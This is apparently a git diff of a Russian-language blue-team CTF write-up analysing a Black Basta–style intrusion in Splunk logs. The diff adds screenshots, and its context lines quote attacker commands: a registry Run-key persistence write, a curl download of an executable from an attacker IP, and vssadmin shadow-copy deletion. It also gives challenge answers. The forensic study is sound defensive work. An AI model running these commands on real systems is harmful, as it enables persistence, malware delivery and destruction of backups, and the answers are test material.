@@ -16,6 +16,9 @@ https://cyberdefenders.org/blueteam-ctf-challenges/black-basta/ (Splunk/CyberChe
 **Ответ:**`http://54.93.105.22/Financial%20Records.zip`
 (при поиске использовала событие Sysmon EventID=15, которое фиксирует маркер зоны безопасности `Zone.Identifier` для файлов, которые скачанны из интернета)
 
+<img width="600" height="250" alt="recor" src="https://github.com/user-attachments/assets/c6a12261-874f-4c22-b0bb-7cba40785751" />
+
+
 #### Вопрос 2.После распаковки архива сотрудник открыл Excel файл, который запустил вредоносный макрос. Какой SHA256 у этого файла?
 
 **Ответ:**`030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15` 
@@ -86,6 +89,9 @@ $objShell = New-Object -ComObject WScript.Shell
 $objShell.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater", "wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs", "REG_SZ")
 ```
 Ключ Run в HKCU дает выполнение скрипта при каждом входе пользователя. 
+
+<img width="700" height="350" alt="создание раздела реестра" src="https://github.com/user-attachments/assets/5684efe8-6a2a-4b02-bc81-4256097e039c" />
+
 
 #### Вопрос 9. Для обхода детектирования злоумышленник исключил 3 директории из сканирования Windows Defender. Какие полные пути у этих директорий?
 
@@ -160,6 +166,9 @@ cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\6as98v.exe" http://54.93.
 
 Тут мы видим сканирование диапазона с попыткой охватить всю подсеть и затем сохранение результатов в файл)
 
+<img width="700" height="350" alt="netscan" src="https://github.com/user-attachments/assets/86d4b045-441d-4e6b-b539-cbd73daa2864" />
+
+
 #### Вопрос 16. Для эксфильтрации данных с домен-контроллера использовалась привилегированная учётная запись домена. Какая учётная запись была скомпрометирована на DC01?
 
 **Ответ:** `swhite`
@@ -208,6 +217,8 @@ C:\Windows\system32\cmd.exe /c C:\Windows\SysNative\vssadmin.exe delete shadows 
 <Data Name='User'>NT AUTHORITY\SYSTEM</Data>
 <Data Name='ParentImage'>C:\Users\swhite\AppData\Local\Temp\6as98v.exe</Data>
 ```
+<img width="700" height="350" alt="теневые копии" src="https://github.com/user-attachments/assets/3848278f-8805-40bf-a346-4b2c81889c2c" />
+
 
 #### Вопрос 20. Для блокировки восстановления системы злоумышленник выполнил команду удаления теневых копий. Какая системная утилита использовалась для этого действия?
 
